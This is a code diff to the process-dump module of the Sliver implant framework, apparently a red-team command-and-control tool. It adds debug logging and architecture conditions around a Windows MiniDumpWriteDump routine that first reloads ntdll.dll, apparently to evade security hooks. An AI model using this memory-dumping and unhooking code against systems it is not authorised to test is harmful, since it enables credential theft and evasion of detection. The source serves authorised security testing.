@@ -3,8 +3,15 @@ package procdump
 import (
 	"fmt"
 	"io/ioutil"
-	"os"
+
+	//{{if .Debug}}
+	"log"
+	//{{end}}
+
+	// {{if eq .GOARCH "amd64"}}
 	"sliver/sliver/taskrunner"
+	// {{end}}
+	"os"
 	"syscall"
 	"unsafe"
 )
@@ -107,12 +114,24 @@ func minidump(pid, proc int) (ProcessDump, error) {
 	dump := &WindowsDump{}
 	dbgHelp := syscall.NewLazyDLL("DbgHelp.dll")
 	minidumpWriteDump := dbgHelp.NewProc("MiniDumpWriteDump")
+	// {{if eq .GOARCH "amd64"}}
+	// Hotfix for #66 - need to dig deeper
 	err := taskrunner.RefreshPE(`c:\windows\system32\ntdll.dll`)
 	if err != nil {
+		//{{if .Debug}}
+		log.Println("RefreshPE failed:", err)
+		//{{end}}
 		return dump, err
 	}
+	// {{end}}
 	// TODO: find a better place to store the dump file
 	f, err := ioutil.TempFile("", "")
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("Failed to create temp file:", err)
+		//{{end}}
+		return dump, err
+	}
 
 	if err != nil {
 		return dump, err
@@ -123,10 +142,16 @@ func minidump(pid, proc int) (ProcessDump, error) {
 		data, err := ioutil.ReadFile(f.Name())
 		dump.data = data
 		if err != nil {
+			//{{if .Debug}}
+			log.Println("ReadFile failed:", err)
+			//{{end}}
 			return dump, err
 		}
 		os.Remove(f.Name())
 	} else {
+		//{{if .Debug}}
+		log.Println("Minidump syscall failed:", e)
+		//{{end}}
 		return dump, e
 	}
 	return dump, nil
